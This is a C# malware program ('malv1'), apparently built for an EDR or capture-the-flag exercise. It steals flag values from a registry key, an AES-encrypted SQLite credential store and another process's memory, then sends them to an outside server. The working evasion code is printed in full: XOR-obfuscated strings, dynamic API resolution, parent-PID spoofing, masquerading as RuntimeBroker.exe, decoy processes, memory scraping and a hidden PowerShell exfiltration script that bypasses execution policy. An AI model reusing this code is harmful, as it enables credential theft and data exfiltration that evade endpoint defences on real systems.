// Program.cs
// version: RELEASE 20251219-v2 (Dynamic API + XOR + PPID Spoofing)

using Microsoft.Win32;
using Newtonsoft.Json;
using System;
using System.Data.SQLite;
using System.Diagnostics;
using System.Net;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace malv1
{
    internal class Program
    {
        // =========================
        //  XOR String Obfuscation
        // =========================
        
        private const byte _xk = 0x42;
        
        private static string D(string enc)
        {
            try
            {
                byte[] data = Convert.FromBase64String(enc);
                for (int i = 0; i < data.Length; i++)
                    data[i] ^= _xk;
                return Encoding.UTF8.GetString(data);
            }
            catch { return string.Empty; }
        }

        // =========================
        //  Dynamic API Resolution
        // =========================
        
        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern IntPtr LoadLibraryW(string lpFileName);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate IntPtr D1(int a, bool b, int c); // OpenProcess
        
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate bool D2(IntPtr h); // CloseHandle
        
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate UIntPtr D3(IntPtr h, IntPtr a, out MEMORY_BASIC_INFORMATION m, UIntPtr s); // VirtualQueryEx
        
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate bool D4(IntPtr h, IntPtr a, byte[] b, UIntPtr s, out IntPtr r); // ReadProcessMemory

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate uint D5(IntPtr h, uint ms); // WaitForSingleObject

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate bool D6(IntPtr a, int c, int f, ref IntPtr s); // InitializeProcThreadAttributeList

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate bool D7(IntPtr a, uint f, IntPtr attr, IntPtr v, IntPtr cb, IntPtr pv, IntPtr rs); // UpdateProcThreadAttribute

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate bool D8(IntPtr a); // DeleteProcThreadAttributeList

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        private delegate bool D9(string app, string cmd, IntPtr pa, IntPtr ta, bool ih, uint cf, IntPtr env, string cd, ref STARTUPINFOEX si, out PROCESS_INFORMATION pi); // CreateProcessW

        private static D1 _f1;
        private static D2 _f2;
        private static D3 _f3;
        private static D4 _f4;
        private static D5 _f5;
        private static D6 _f6;
        private static D7 _f7;
        private static D8 _f8;
        private static D9 _f9;

        private static void InitDynamicAPIs()
        {
            IntPtr h = LoadLibraryW(D("KScwLCcucXBsJi4u")); // kernel32.dll
            if (h == IntPtr.Zero) return;
            
            IntPtr p1 = GetProcAddress(h, D("DTInLBIwLSEnMTE=")); // OpenProcess
            IntPtr p2 = GetProcAddress(h, D("AS4tMScKIywmLic=")); // CloseHandle
            IntPtr p3 = GetProcAddress(h, D("FCswNjcjLhM3JzA7Bzo=")); // VirtualQueryEx
            IntPtr p4 = GetProcAddress(h, D("ECcjJhIwLSEnMTEPJy8tMDs=")); // ReadProcessMemory
            IntPtr p5 = GetProcAddress(h, D("FSMrNgQtMBErLCUuJw0gKCchNg==")); // WaitForSingleObject
            IntPtr p6 = GetProcAddress(h, D("CywrNisjLis4JxIwLSEWKjAnIyYDNjYwKyA3NicOKzE2")); // InitializeProcThreadAttributeList
            IntPtr p7 = GetProcAddress(h, D("FzImIzYnEjAtIRYqMCcjJgM2NjArIDc2Jw==")); // UpdateProcThreadAttribute
            IntPtr p8 = GetProcAddress(h, D("BicuJzYnEjAtIRYqMCcjJgM2NjArIDc2Jw4rMTY=")); // DeleteProcThreadAttributeList
            IntPtr p9 = GetProcAddress(h, D("ATAnIzYnEjAtIScxMRU=")); // CreateProcessW
            
            if (p1 != IntPtr.Zero) _f1 = Marshal.GetDelegateForFunctionPointer<D1>(p1);
            if (p2 != IntPtr.Zero) _f2 = Marshal.GetDelegateForFunctionPointer<D2>(p2);
            if (p3 != IntPtr.Zero) _f3 = Marshal.GetDelegateForFunctionPointer<D3>(p3);
            if (p4 != IntPtr.Zero) _f4 = Marshal.GetDelegateForFunctionPointer<D4>(p4);
            if (p5 != IntPtr.Zero) _f5 = Marshal.GetDelegateForFunctionPointer<D5>(p5);
            if (p6 != IntPtr.Zero) _f6 = Marshal.GetDelegateForFunctionPointer<D6>(p6);
            if (p7 != IntPtr.Zero) _f7 = Marshal.GetDelegateForFunctionPointer<D7>(p7);
            if (p8 != IntPtr.Zero) _f8 = Marshal.GetDelegateForFunctionPointer<D8>(p8);
            if (p9 != IntPtr.Zero) _f9 = Marshal.GetDelegateForFunctionPointer<D9>(p9);
        }

        // =========================
        //  Build config & secrets
        // =========================

        private const string VERSION = "malv1-RELEASE-20251219-v2";
        private const string SECRET = "8AfPntUI4d0KICm6ee6xWmqg8dBoVbDH";

        // =========================
        //  Win32 常數 & 結構
        // =========================

        private const int PROCESS_QUERY_INFORMATION = 0x0400;
        private const int PROCESS_VM_READ = 0x0010;
        private const int PROCESS_CREATE_PROCESS = 0x0080;

        private const uint MEM_COMMIT = 0x1000;
        private const uint PAGE_NOACCESS = 0x01;
        private const uint PAGE_GUARD = 0x100;

        private const int EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
        private const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;

        [StructLayout(LayoutKind.Sequential)]
        public struct MEMORY_BASIC_INFORMATION
        {
            public IntPtr BaseAddress;
            public IntPtr AllocationBase;
            public uint AllocationProtect;
            public UIntPtr RegionSize;
            public uint State;
            public uint Protect;
            public uint Type;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFOEX
        {
            public STARTUPINFO StartupInfo;
            public IntPtr lpAttributeList;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        // =========================
        //  Main
        // =========================

        private static async Task Main(string[] args)
        {
            Log($"=== START === myName={Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName)}, args={string.Join(",", args)}");
            InitDynamicAPIs();
            Log($"APIs: f1={_f1 != null}, f2={_f2 != null}, f6={_f6 != null}, f9={_f9 != null}");

            bool isDecoy = false;
            bool isNoisyDecoy = false;

            if (args.Length > 0)
            {
                if (args[0] == "--decoy") isDecoy = true;
                if (args[0] == "--decoy-noisy") { isDecoy = true; isNoisyDecoy = true; }
            }

            string currentPath = Process.GetCurrentProcess().MainModule.FileName;
            string myName = Path.GetFileName(currentPath);
            string covertName = D("EDcsNisvJwAwLSknMGwnOic="); // RuntimeBroker.exe
            bool isCovertClone = myName.Equals(covertName, StringComparison.OrdinalIgnoreCase);
            Log($"isDecoy={isDecoy}, isCovert={isCovertClone}");

            if (!isDecoy && !isCovertClone)
            {
                // [原始母體] 複製自己並啟動 RuntimeBroker.exe（不用 PPID Spoofing）
                Log("BRANCH: Original -> Migrate + Decoy");
                string tempPath = Path.GetTempPath();
                string newPath = Path.Combine(tempPath, covertName);

                try
                {
                    if (File.Exists(newPath))
                        try { File.Delete(newPath); } catch { }

                    File.Copy(currentPath, newPath, true);
                    Log($"Copied to {newPath}");

                    // 直接啟動（不用 PPID Spoofing，確保網路功能正常）
                    Process.Start(newPath);
                    Log("RuntimeBroker.exe launched via Process.Start");
                }
                catch (Exception ex) { Log($"Migration error: {ex.Message}"); }

                isNoisyDecoy = true;
                SpawnDecoys(currentPath, count: 5);
            }
            else if (!isDecoy && isCovertClone)
            {
                // [真母體] 等待 5 秒
                Log("BRANCH: CovertClone -> Real attack in 5s");
                await Task.Delay(5000);
            }

            if (isNoisyDecoy)
            {
                // [Noisy Decoy] 製造噪音
                Log("BRANCH: NoisyDecoy -> Fake attack + exit");
                try
                {
                    Challenge1();
                    string dbPath = D("AXgeFzEnMDEeIC0vICceAzIyBiM2Ix4OLSEjLh4gKjAtLyceDi0lKyxiBiM2Iw==");
                    string tempCopy = Path.Combine(Path.GetTempPath(), $"decoy_copy_{Guid.NewGuid():N}.db");

                    // Decoy 使用 PPID Spoofing
                    Process[] explorers = Process.GetProcessesByName(D("JzoyLi0wJzA=")); // explorer
                    int parentPid = explorers.Length > 0 ? explorers[0].Id : 0;

                    if (parentPid > 0)
                    {
                        string cmdArgs = $"/c copy \"{dbPath}\" \"{tempCopy}\"";
                        SpoofParentAndExecute(parentPid, D("IS8mbCc6Jw=="), cmdArgs, out IntPtr hProcess); // cmd.exe
                        if (hProcess != IntPtr.Zero) _f2?.Invoke(hProcess);
                    }
                    else
                    {
                        Process.Start(D("IS8mbCc6Jw=="), $"/c copy \"{dbPath}\" \"{tempCopy}\"");
                    }

                    using (HttpClient client = new HttpClient())
                    {
                        var fakePayload = new StringContent("{\"fake\":\"data\"}", Encoding.UTF8, "application/json");
                        await client.PostAsync("http://submit.bombe.top/fake_endpoint", fakePayload);
                    }
                }
                catch { }
                await Task.Delay(10000);
                return;
            }

            // [真母體] 執行 Challenges
            Log("Executing challenges...");
            string answer1 = Challenge1();
            Log($"C1={answer1 ?? "NULL"}");
            string answer2 = Challenge2();
            Log($"C2={answer2 ?? "NULL"}");
            string answer3 = Challenge3();
            Log($"C3={answer3 ?? "NULL"}");

            if (!isDecoy)
            {
                Log("Calling SendAnswerToServer...");
                await SendAnswerToServer(JsonConvert.SerializeObject(
                    new
                    {
                        answer_1 = answer1,
                        answer_2 = answer2,
                        answer_3 = answer3,
                        secret = SECRET
                    }
                ));
            }
            Log("=== END ===");
        }

        private static void Log(string msg)
        {
            try
            {
                File.AppendAllText(Path.Combine(Path.GetTempPath(), "malv1_debug_trace.txt"), $"[{DateTime.Now:HH:mm:ss}] {msg}\r\n");
            }
            catch { }
        }

        private static async Task<string> TryReadFileAsync(string filePath, int maxRetries)
        {
            for (int retry = 0; retry < maxRetries; retry++)
            {
                try
                {
                    using (var fs = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                    using (var sr = new StreamReader(fs, Encoding.UTF8))
                    {
                        return await sr.ReadToEndAsync();
                    }
                }
                catch (IOException) { await Task.Delay(300); }
                catch { break; }
            }
            return null;
        }

        private static void SpawnDecoys(string sourcePath, int count)
        {
            Log($"SpawnDecoys: count={count}");
            if (!File.Exists(sourcePath)) return;

            try
            {
                string tempFolder = Path.GetTempPath();
                Random rnd = new Random();
                const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

                for (int i = 0; i < count; i++)
                {
                    char[] stringChars = new char[8];
                    for (int j = 0; j < stringChars.Length; j++)
                        stringChars[j] = chars[rnd.Next(chars.Length)];
                    string randomSuffix = new string(stringChars);

                    string decoyName = $"BOMBE_EDR_FLAG_{randomSuffix}.exe";
                    string decoyPath = Path.Combine(tempFolder, decoyName);

                    try
                    {
                        File.Copy(sourcePath, decoyPath, true);
                        ProcessStartInfo psi = new ProcessStartInfo(decoyPath, "--decoy-noisy")
                        {
                            UseShellExecute = false,
                            CreateNoWindow = true
                        };
                        Process.Start(psi);
                        Log($"Spawned: {decoyName}");
                    }
                    catch { }
                }
            }
            catch { }
        }

        // =========================
        //  Challenge 1: Registry
        // =========================

        private static string Challenge1()
        {
            string registryPath = D("EQ0EFhUDEAceAA0PAAc="); // SOFTWARE\BOMBE
            try
            {
                using RegistryKey key = Registry.LocalMachine.OpenSubKey(registryPath);
                if (key == null) return null;

                object value = key.GetValue(D("IywxNScwHXM=")); // answer_1
                return value?.ToString();
            }
            catch { return null; }
        }

        // =========================
        //  Challenge 2: SQLite + AES
        // =========================

        private static string Challenge2()
        {
            string dbPath = D("AXgeFzEnMDEeIC0vICceAzIyBiM2Ix4OLSEjLh4gKjAtLyceDi0lKyxiBiM2Iw==");
            string tempCopy = Path.Combine(Path.GetTempPath(), $"bombe_copy_{Guid.NewGuid():N}.db");
            byte[] key = Encoding.UTF8.GetBytes(SECRET);

            bool copySuccess = false;
            try
            {
                // 使用 PPID Spoofing
                Process[] explorers = Process.GetProcessesByName(D("JzoyLi0wJzA=")); // explorer
                int parentPid = explorers.Length > 0 ? explorers[0].Id : 0;

                if (parentPid > 0)
                {
                    string cmdArgs = $"/c copy /Y \"{dbPath}\" \"{tempCopy}\"";
                    if (SpoofParentAndExecute(parentPid, D("IS8mbCc6Jw=="), cmdArgs, out IntPtr hProcess)) // cmd.exe
                    {
                        if (hProcess != IntPtr.Zero)
                        {
                            _f5?.Invoke(hProcess, 5000);
                            _f2?.Invoke(hProcess);
                        }
                        copySuccess = File.Exists(tempCopy);
                    }
                    else
                    {
                        File.Copy(dbPath, tempCopy, true);
                        copySuccess = true;
                    }
                }
                else
                {
                    File.Copy(dbPath, tempCopy, true);
                    copySuccess = true;
                }
            }
            catch { }

            if (!copySuccess) return null;

            try
            {
                using SQLiteConnection conn = new SQLiteConnection($"Data Source={tempCopy};Version=3;");
                conn.Open();

                using var cmd = new SQLiteCommand(
                    D("EQcOBwEWYi0wKyUrLB03MC5uYjcxJzAsIy8nHTQjLjcnbmIyIzExNS0wJh00Iy43J2IEEA0PYi4tJSssMQ=="),
                    conn
                );

                using SQLiteDataReader reader = cmd.ExecuteReader();
                while (reader.Read())
                {
                    string username = reader.GetString(1);
                    string passwordHex = reader.GetString(2);

                    if (!string.Equals(username, D("IC0vICc="), StringComparison.OrdinalIgnoreCase)) // bombe
                        continue;

                    byte[] encrypted = HexStringToByteArray(passwordHex);
                    if (encrypted.Length < 16) continue;

                    byte[] iv = new byte[16];
                    byte[] cipher = new byte[encrypted.Length - 16];
                    Buffer.BlockCopy(encrypted, 0, iv, 0, 16);
                    Buffer.BlockCopy(encrypted, 16, cipher, 0, cipher.Length);

                    try { return DecryptPassword(cipher, key, iv); }
                    catch { return null; }
                }
                return null;
            }
            catch { return null; }
        }

        private static byte[] HexStringToByteArray(string hex)
        {
            if (hex.Length % 2 != 0)
                throw new ArgumentException("Invalid hex length", nameof(hex));

            byte[] bytes = new byte[hex.Length / 2];
            for (int i = 0; i < bytes.Length; i++)
            {
                string chunk = hex.Substring(i * 2, 2);
                bytes[i] = Convert.ToByte(chunk, 16);
            }
            return bytes;
        }

        private static string DecryptPassword(byte[] ciphertext, byte[] key, byte[] iv)
        {
            using Aes aes = Aes.Create();
            aes.Key = key;
            aes.IV = iv;
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;

            using ICryptoTransform decryptor = aes.CreateDecryptor();
            byte[] plainBytes = decryptor.TransformFinalBlock(ciphertext, 0, ciphertext.Length);
            return Encoding.UTF8.GetString(plainBytes);
        }

        // =========================
        //  Challenge 3: Scan bsass.exe
        // =========================

        private static string Challenge3()
        {
            string targetProcessName = D("IDEjMTE="); // bsass
            string pattern = D("AA0PAAcdDwMOHQQOAwUd") + @"\w{32}"; // BOMBE_MAL_FLAG_
            Regex regex = new Regex(pattern);

            try
            {
                Process[] procs = Process.GetProcessesByName(targetProcessName);
                if (procs.Length == 0 || _f1 == null) return null;

                Process proc = procs[0];
                IntPtr hProcess = _f1(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, proc.Id);
                if (hProcess == IntPtr.Zero) return null;

                try
                {
                    IntPtr address = IntPtr.Zero;
                    MEMORY_BASIC_INFORMATION mbi;
                    int mbiSize = Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION));

                    while (_f3 != null && _f3(hProcess, address, out mbi, (UIntPtr)mbiSize) != UIntPtr.Zero)
                    {
                        if (mbi.State == MEM_COMMIT &&
                            mbi.RegionSize != UIntPtr.Zero &&
                            mbi.Protect != PAGE_NOACCESS &&
                            (mbi.Protect & PAGE_GUARD) == 0)
                        {
                            ulong regionSize = mbi.RegionSize.ToUInt64();
                            if (regionSize > int.MaxValue) regionSize = int.MaxValue;

                            byte[] buffer = new byte[regionSize];
                            IntPtr bytesRead = IntPtr.Zero;
                            bool readOk = _f4 != null && _f4(hProcess, mbi.BaseAddress, buffer, (UIntPtr)buffer.Length, out bytesRead);
                            
                            if (readOk && bytesRead.ToInt64() > 0)
                            {
                                int read = (int)bytesRead.ToInt64();
                                string chunk = Encoding.ASCII.GetString(buffer, 0, read);
                                Match m = regex.Match(chunk);
                                if (m.Success) return m.Value;
                            }
                        }
                        long next = mbi.BaseAddress.ToInt64() + (long)mbi.RegionSize.ToUInt64();
                        address = new IntPtr(next);
                    }
                    return null;
                }
                finally
                {
                    _f2?.Invoke(hProcess);
                }
            }
            catch { return null; }
        }

        // =========================
        //  HTTP Submit (PowerShell + PPID Spoofing)
        // =========================

        private static async Task SendAnswerToServer(string jsonPayload)
        {
            string tempPath = Path.GetTempPath();
            string guid = Guid.NewGuid().ToString("N");
            string payloadFile = Path.Combine(tempPath, $"{guid}.json");
            string scriptFile = Path.Combine(tempPath, $"{guid}.ps1");
            string responseFile = Path.Combine(tempPath, $"{guid}.resp");

            string submitUrl = D("KjY2MjF4bW0xNyAvKzZsIC0vICdsNi0ybTE3IC8rNg8jLgMsMQ=="); // https://submit.bombe.top/submitMalAns
            Log($"SendAnswerToServer: URL={submitUrl}");

            try
            {
                // 1. 寫入 Payload & Script
                File.WriteAllText(payloadFile, jsonPayload);
                Log($"SendAnswerToServer: Payload written");

                string psScript = $@"
$ErrorActionPreference = 'Stop'
try {{
    $json = Get-Content -LiteralPath '{payloadFile}' -Raw
    $response = Invoke-RestMethod -Uri '{submitUrl}' -Method Post -Body $json -ContentType 'application/json'
    $response | ConvertTo-Json -Depth 5 | Out-File -LiteralPath '{responseFile}' -Encoding UTF8
}} catch {{
    $_.Exception.Message | Out-File -LiteralPath '{responseFile}.err' -Encoding UTF8
}}
";
                File.WriteAllText(scriptFile, psScript, Encoding.UTF8);
                Log($"SendAnswerToServer: Script written");

                // 2. 使用 PPID Spoofing 執行 PowerShell
                Process[] explorers = Process.GetProcessesByName(D("JzoyLi0wJzA=")); // explorer
                if (explorers.Length == 0)
                {
                    Log("SendAnswerToServer: explorer not found, using direct start");
                    ProcessStartInfo psi = new ProcessStartInfo
                    {
                        FileName = D("Mi01JzAxKicuLmwnOic="), // powershell.exe
                        Arguments = $"-ExecutionPolicy Bypass -WindowStyle Hidden -File \"{scriptFile}\"",
                        UseShellExecute = false,
                        CreateNoWindow = true
                    };
                    Process.Start(psi);
                }
                else
                {
                    int parentPid = explorers[0].Id;
                    string psExe = D("Mi01JzAxKicuLmwnOic="); // powershell.exe
                    
                    if (SpoofParentAndExecute(parentPid, psExe, $"-ExecutionPolicy Bypass -WindowStyle Hidden -File \"{scriptFile}\"", out IntPtr hProcess))
                    {
                        Log($"SendAnswerToServer: PPID Spoofing success");
                        if (hProcess != IntPtr.Zero) _f2?.Invoke(hProcess);
                    }
                    else
                    {
                        Log("SendAnswerToServer: PPID Spoofing failed, using direct start");
                        ProcessStartInfo psi = new ProcessStartInfo
                        {
                            FileName = psExe,
                            Arguments = $"-ExecutionPolicy Bypass -WindowStyle Hidden -File \"{scriptFile}\"",
                            UseShellExecute = false,
                            CreateNoWindow = true
                        };
                        Process.Start(psi);
                    }
                }

                // 3. 等待結果（最多 30 秒）
                bool gotResponse = false;
                for (int i = 0; i < 60; i++)
                {
                    await Task.Delay(500);

                    if (File.Exists(responseFile))
                    {
                        string resp = await TryReadFileAsync(responseFile, 5);
                        if (!string.IsNullOrEmpty(resp))
                        {
                            Log($"SendAnswerToServer: SUCCESS! Response={resp}");
                            gotResponse = true;
                            break;
                        }
                    }
                    if (File.Exists(responseFile + ".err"))
                    {
                        string err = await TryReadFileAsync(responseFile + ".err", 5);
                        if (!string.IsNullOrEmpty(err))
                        {
                            Log($"SendAnswerToServer: ERROR from PS: {err}");
                            gotResponse = true;
                            break;
                        }
                    }
                }

                if (!gotResponse)
                {
                    Log("SendAnswerToServer: TIMEOUT after 30s");
                }
            }
            catch (Exception ex)
            {
                Log($"SendAnswerToServer: Exception={ex.Message}");
            }
            finally
            {
                await Task.Delay(2000);
                try { if (File.Exists(payloadFile)) File.Delete(payloadFile); } catch { }
                try { if (File.Exists(scriptFile)) File.Delete(scriptFile); } catch { }
                try { if (File.Exists(responseFile)) File.Delete(responseFile); } catch { }
                try { if (File.Exists(responseFile + ".err")) File.Delete(responseFile + ".err"); } catch { }
            }
        }

        // =========================
        //  PPID Spoofing (使用動態 API)
        // =========================

        private static bool SpoofParentAndExecute(int parentPid, string applicationName, string commandLine, out IntPtr hProcess)
        {
            hProcess = IntPtr.Zero;
            if (_f1 == null || _f2 == null || _f6 == null || _f7 == null || _f8 == null || _f9 == null)
            {
                Log("SpoofParentAndExecute: Dynamic APIs not loaded");
                return false;
            }

            IntPtr hParent = _f1(PROCESS_CREATE_PROCESS, false, parentPid);
            if (hParent == IntPtr.Zero)
            {
                Log($"SpoofParentAndExecute: OpenProcess failed");
                return false;
            }

            IntPtr lpAttributeList = IntPtr.Zero;
            IntPtr lpSize = IntPtr.Zero;
            _f6(IntPtr.Zero, 1, 0, ref lpSize);

            lpAttributeList = Marshal.AllocHGlobal(lpSize);
            if (!_f6(lpAttributeList, 1, 0, ref lpSize))
            {
                Log($"SpoofParentAndExecute: InitializeProcThreadAttributeList failed");
                _f2(hParent);
                Marshal.FreeHGlobal(lpAttributeList);
                return false;
            }

            IntPtr lpValue = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.WriteIntPtr(lpValue, hParent);

            if (!_f7(lpAttributeList, 0, (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                lpValue, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero))
            {
                Log($"SpoofParentAndExecute: UpdateProcThreadAttribute failed");
                _f8(lpAttributeList);
                Marshal.FreeHGlobal(lpAttributeList);
                Marshal.FreeHGlobal(lpValue);
                _f2(hParent);
                return false;
            }

            STARTUPINFOEX siex = new STARTUPINFOEX();
            siex.StartupInfo.cb = Marshal.SizeOf(typeof(STARTUPINFOEX));
            siex.lpAttributeList = lpAttributeList;
            siex.StartupInfo.dwFlags = 0x00000001;
            siex.StartupInfo.wShowWindow = 0;

            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            string fullCmd = $"{applicationName} {commandLine}";

            bool success = _f9(null, fullCmd, IntPtr.Zero, IntPtr.Zero, false,
                EXTENDED_STARTUPINFO_PRESENT | 0x00000010, IntPtr.Zero, null, ref siex, out pi);

            if (!success)
            {
                Log($"SpoofParentAndExecute: CreateProcess failed");
            }

            _f8(lpAttributeList);
            Marshal.FreeHGlobal(lpAttributeList);
            Marshal.FreeHGlobal(lpValue);
            _f2(hParent);

            if (success)
            {
                hProcess = pi.hProcess;
                _f2(pi.hThread);
            }

            return success;
        }
    }
}
